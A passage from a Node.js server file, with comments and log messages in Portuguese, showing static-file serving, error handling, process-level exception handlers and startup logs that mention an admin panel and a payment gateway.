        });
        file.pipe(res);
      });
      return;
    }

    fs.readFile(filePath, (readErr, content) => {
      if (readErr) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Internal Server Error');
        return;
      }

      res.writeHead(200, {
        'Content-Type': contentType,
        'Cache-Control': ext === '.html' ? 'no-cache' : 'public, max-age=86400'
      });
      res.end(content);
    });
  });
};

const server = http.createServer(async (req, res) => {
  try {
    await handler(req, res);
  } catch (err) {
    console.error('Erro não tratado na requisição:', err);
    if (!res.headersSent) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Erro interno do servidor.' }));
    } else {
      res.end();
    }
  }
});

process.on('uncaughtException', (err) => {
  console.error('Exceção não capturada (servidor continua rodando):', err);
});
process.on('unhandledRejection', (err) => {
  console.error('Promise rejeitada sem tratamento (servidor continua rodando):', err);
});

if (require.main === module) {
  server.listen(PORT, () => {
    console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
    console.log(`🔒 Painel Admin RecuperaBrasil: http://localhost:${PORT}/admin`);
    console.log(`💳 Gateway FreePay: ATIVO EM PRODUÇÃO COM TODAS AS ROTAS`);
  });
}

module.exports = handler;
